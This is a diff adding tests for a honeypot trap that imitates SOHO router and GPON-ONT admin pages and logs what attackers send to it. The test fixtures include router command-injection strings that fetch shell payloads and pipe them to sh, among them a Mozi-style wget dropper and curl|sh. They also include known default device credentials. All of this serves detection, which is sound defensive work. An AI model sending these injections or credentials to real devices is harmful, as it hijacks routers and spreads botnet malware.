@@ -629,6 +629,7 @@ def test_all_trap_families_default_on():
     assert tbenv.FORTIGATE_VPN_ENABLED
     assert tbenv.HIKVISION_ENABLED
     assert tbenv.HNAP1_ENABLED
+    assert tbenv.SOHO_ROUTER_ENABLED
     assert tbenv.SERVER_STATUS_ENABLED
     assert tbenv.GEOSERVER_ENABLED
     assert tbenv.LIFERAY_ENABLED
@@ -16005,3 +16006,247 @@ def test_app_config_disabled_when_canary_traps_off(monkeypatch):
     switch of its own."""
     monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", False)
     assert tbenv.CANARY_TRAPS_ENABLED is False
+
+
+# --- SOHO router / GPON-ONT web-admin trap -------------------------------
+#
+# Path dictionary and payload shapes below are taken verbatim from probes
+# this surface received while it was still returning 404.
+
+
+def test_soho_router_enabled_by_default():
+    assert tbenv.SOHO_ROUTER_ENABLED
+
+
+def test_soho_router_default_paths_match_observed_probes():
+    for path in (
+        "/boaform/admin/formLogin",
+        "/boaform/admin/formPing",
+        "/BOAFORM/admin/formLogin",  # case-insensitive
+        "/goform/formJsonAjaxReq",
+        "/goform/setSysAdm",
+        "/setup.cgi",
+        "/tmUnblock.cgi",
+        "/hndUnblock.cgi",
+        "/soap.cgi",
+        "/login.cgi",
+        "/cgi-bin/login.cgi",
+        "/web/cgi-bin/hi3510/login.cgi",
+        "/cgi-bin/luci/",
+    ):
+        assert tbenv.is_soho_router_path(path), f"expected match: {path}"
+
+
+def test_soho_router_luci_stok_prefix_matches():
+    """TP-Link's LuCI hole carries a per-request session token in the path,
+    so an exact-set match alone would miss every real probe."""
+    assert tbenv.is_soho_router_path("/cgi-bin/luci/;stok=deadbeef/locale")
+    assert tbenv.is_soho_router_path(
+        "/cgi-bin/luci/;stok=abc123/locale?form=country&operation=write"
+    )
+
+
+def test_soho_router_path_non_match():
+    for path in (
+        "/",
+        "/.env",
+        "/HNAP1",                      # owned by the HNAP1 trap
+        "/wp-login.php",
+        "/cgi-bin/",
+        "/thruk/cgi-bin/login.cgi",    # monitoring app, not a router
+        "/boaform",
+    ):
+        assert not tbenv.is_soho_router_path(path), f"unexpected match: {path}"
+
+
+def test_soho_router_disabled_returns_false(monkeypatch):
+    monkeypatch.setattr(tbenv, "SOHO_ROUTER_ENABLED", False)
+    assert not tbenv.is_soho_router_path("/boaform/admin/formLogin")
+    assert not tbenv.is_soho_router_path("/cgi-bin/luci/;stok=x/locale")
+
+
+def test_soho_router_hnap1_still_owns_its_paths():
+    """Dispatch order regression: /HNAP1 must not be swallowed by the
+    broader router trap."""
+    assert tbenv.is_hnap1_path("/HNAP1")
+    assert not tbenv.is_soho_router_path("/HNAP1")
+
+
+# --- payload-URL extraction ---
+
+
+def test_extract_payload_urls_from_observed_netgear_syscmd():
+    """The real Netgear DGN `todo=syscmd` shape. `+` is the space encoding
+    in a query string, so the extractor must not glue the shell's trailing
+    `-O /tmp/netgear` onto the URL."""
+    from urllib.parse import unquote_plus
+    raw = (
+        "next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;"
+        "wget+http://192.0.2.10:8088/Mozi.m+-O+/tmp/netgear;sh+netgear"
+    )
+    decoded = unquote_plus(raw)
+    assert tbenv._extract_payload_urls(decoded) == ["http://192.0.2.10:8088/Mozi.m"]
+    assert "wget" in tbenv._extract_downloaders(decoded)
+
+
+def test_extract_payload_urls_tftp_without_scheme():
+    """`tftp -g -r <file> <host>` carries no scheme; the host must bind to
+    the server, not to the filename."""
+    urls = tbenv._extract_payload_urls("cmd=tftp -g -r bin.sh 198.51.100.7; chmod +x bin.sh")
+    assert urls == ["tftp://198.51.100.7/bin.sh"]
+    assert "tftp" in tbenv._extract_downloaders(
+        "cmd=tftp -g -r bin.sh 198.51.100.7"
+    )
+
+
+def test_extract_payload_urls_percent_encoded_curl_pipe_sh():
+    from urllib.parse import unquote_plus
+    decoded = unquote_plus("target_addr=127.0.0.1;curl%20http://198.51.100.9/x.sh|sh")
+    assert tbenv._extract_payload_urls(decoded) == ["http://198.51.100.9/x.sh"]
+    assert "curl" in tbenv._extract_downloaders(decoded)
+
+
+def test_extract_payload_urls_busybox_wget_in_command_substitution():
+    decoded = "operation=write&country=$(busybox wget http://203.0.113.4/t -O- | sh)"
+    assert tbenv._extract_payload_urls(decoded) == ["http://203.0.113.4/t"]
+    tools = tbenv._extract_downloaders(decoded)
+    assert "wget" in tools and "busybox" in tools
+
+
+def test_extract_payload_urls_deduplicates_and_is_empty_when_clean():
+    assert tbenv._extract_payload_urls("username=admin&psd=admin") == []
+    assert tbenv._extract_downloaders("username=admin&psd=admin") == []
+    dupes = tbenv._extract_payload_urls(
+        "wget http://198.51.100.1/a", "curl HTTP://198.51.100.1/a"
+    )
+    assert len(dupes) == 1
+
+
+def test_soho_router_cmdi_flag():
+    assert tbenv._soho_router_has_cmdi("todo=syscmd&cmd=wget http://x/y", "", "/setup.cgi")
+    assert tbenv._soho_router_has_cmdi("", "target_addr=1.1.1.1;reboot", "/boaform/admin/formPing")
+    assert not tbenv._soho_router_has_cmdi("username=admin&psd=admin", "", "/boaform/admin/formLogin")
+
+
+# --- credential extraction ---
+
+
+def test_soho_router_credential_dialects():
+    from urllib.parse import parse_qs
+    # BOA/ONT spelling
+    assert tbenv._soho_router_pick_credentials(
+        parse_qs("username=admin&psd=admin"), {}
+    ) == ("admin", "admin", "query")
+    # generic embedded-httpd spelling
+    assert tbenv._soho_router_pick_credentials(
+        parse_qs("user=root&pwd=vizxv"), {}
+    ) == ("root", "vizxv", "query")
+    # body wins over query when both carry credentials
+    assert tbenv._soho_router_pick_credentials(
+        parse_qs("username=q&psd=q"), parse_qs("username=b&psd=b")
+    ) == ("b", "b", "body")
+    # nothing credential-shaped
+    assert tbenv._soho_router_pick_credentials(parse_qs("foo=bar"), {}) == ("", "", "")
+
+
+# --- end-to-end dispatch ---
+
+
+async def test_soho_router_login_page_served(flux_client):
+    resp = await flux_client.get("/boaform/admin/formLogin")
+    assert resp.status == 200
+    assert resp.headers["Server"].startswith("Boa/")
+    text = await resp.text()
+    assert "psd" in text  # the ONT password field name
+    entries = _log_entries(flux_client.log_path)
+    assert entries[-1]["result"] == "soho-router-login"
+
+
+async def test_soho_router_credentials_captured_from_query(flux_client):
+    resp = await flux_client.get("/boaform/admin/formLogin?username=admin&psd=admin")
+    assert resp.status == 200
+    entries = _log_entries(flux_client.log_path)
+    last = entries[-1]
+    assert last["result"] == "soho-router-credential"
+    assert last["sohoRouterUsername"] == "admin"
+    assert last["sohoRouterPassword"] == "admin"
+    assert last["sohoRouterCredSource"] == "query"
+
+
+async def test_soho_router_credentials_captured_from_body(flux_client):
+    resp = await flux_client.post(
+        "/boaform/admin/formLogin",
+        data="username=root&psd=xc3511",
+        headers={"Content-Type": "application/x-www-form-urlencoded"},
+    )
+    assert resp.status == 200
+    last = _log_entries(flux_client.log_path)[-1]
+    assert last["result"] == "soho-router-credential"
+    assert last["sohoRouterUsername"] == "root"
+    assert last["sohoRouterPassword"] == "xc3511"
+    assert last["sohoRouterCredSource"] == "body"
+
+
+async def test_soho_router_session_cookie_is_per_hit_unique(flux_client):
+    """Nothing fixed: the session cookie is the only credential-shaped
+    field this trap emits, so it must differ per hit."""
+    seen = set()
+    for _ in range(3):
+        resp = await flux_client.get("/boaform/admin/formLogin?username=a&psd=b")
+        cookie = resp.headers.get("Set-Cookie", "")
+        assert cookie.startswith("SESSIONID=")
+        seen.add(cookie)
+    assert len(seen) == 3
+
+
+async def test_soho_router_login_page_carries_no_credential_literal(flux_client):
+    """The login page must not ship a secret-shaped literal — a fixed one
+    would fingerprint every sensor identically."""
+    resp = await flux_client.get("/boaform/admin/formLogin")
+    text = await resp.text()
+    assert "Set-Cookie" not in resp.headers  # no session before auth
+    for needle in ("AKIA", "password=", "psd=admin", "BEGIN OPENSSH"):
+        assert needle not in text
+
+
+async def test_soho_router_syscmd_payload_url_logged(flux_client):
+    """The whole point of the trap: the dropper URL lands in a structured
+    field instead of surviving only inside a truncated body preview."""
+    resp = await flux_client.get(
+        "/setup.cgi?next_file=netgear.cfg&todo=syscmd"
+        "&cmd=rm+-rf+/tmp/*;wget+http://192.0.2.10:8088/Mozi.m+-O+/tmp/n;sh+n"
+    )
+    assert resp.status == 200
+    last = _log_entries(flux_client.log_path)[-1]
+    assert last["result"] == "soho-router-diag"
+    assert last["sohoRouterHasCmdInjection"] is True
+    assert last["sohoRouterPayloadUrls"] == ["http://192.0.2.10:8088/Mozi.m"]
+    assert "wget" in last["sohoRouterDownloaders"]
+
+
+async def test_soho_router_ping_injection_in_body_logged(flux_client):
+    resp = await flux_client.post(
+        "/boaform/admin/formPing",
+        data="target_addr=127.0.0.1;curl http://198.51.100.9/x.sh|sh&waninf=1_INTERNET",
+        headers={"Content-Type": "application/x-www-form-urlencoded"},
+    )
+    assert resp.status == 200
+    last = _log_entries(flux_client.log_path)[-1]
+    assert last["sohoRouterPayloadUrls"] == ["http://198.51.100.9/x.sh"]
+    assert "curl" in last["sohoRouterDownloaders"]
+
+
+async def test_soho_router_clean_request_logs_no_payload_fields(flux_client):
+    resp = await flux_client.get("/goform/formJsonAjaxReq")
+    assert resp.status == 200
+    last = _log_entries(flux_client.log_path)[-1]
+    assert last["sohoRouterHasCmdInjection"] is False
+    assert "sohoRouterPayloadUrls" not in last
+    assert "sohoRouterDownloaders" not in last
+
+
+async def test_soho_router_disabled_returns_404(flux_client, monkeypatch):
+    monkeypatch.setattr(tbenv, "SOHO_ROUTER_ENABLED", False)
+    resp = await flux_client.get("/boaform/admin/formLogin")
+    assert resp.status == 404
+    assert _log_entries(flux_client.log_path)[-1]["result"] == "not-handled"
